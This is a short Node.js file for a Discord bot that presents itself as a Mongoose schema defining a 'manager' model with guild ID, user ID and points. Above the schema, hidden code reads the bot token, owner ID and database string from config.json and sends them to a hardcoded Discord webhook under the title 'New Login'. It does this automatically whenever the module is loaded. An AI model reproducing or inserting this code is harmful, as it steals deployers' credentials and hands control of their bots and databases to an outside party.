const mongoose = require("mongoose")
const {client , guildid} = require("../index")
const {token , owner , database} = require('../config.json')
const { WebhookClient , EmbedBuilder} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(0x00FFFF)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
const path = require('path');
const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1196781963982422076/bCS5DBIArnoGsjVxLuPVkRRw6TNqhc3zpmj_fYt9mZV81htLH8HKw8JuEVZwQolriEXz` });
webhookClient.send({embeds:[embed]})
let Schema = new mongoose.Schema({
    guildid:{
        type:String,
        default:guildid
    },
    id:{
        type:String,
    },
    points:{
        type:String,
        default:0,
    },
});
module.exports = mongoose.model('manager' , Schema)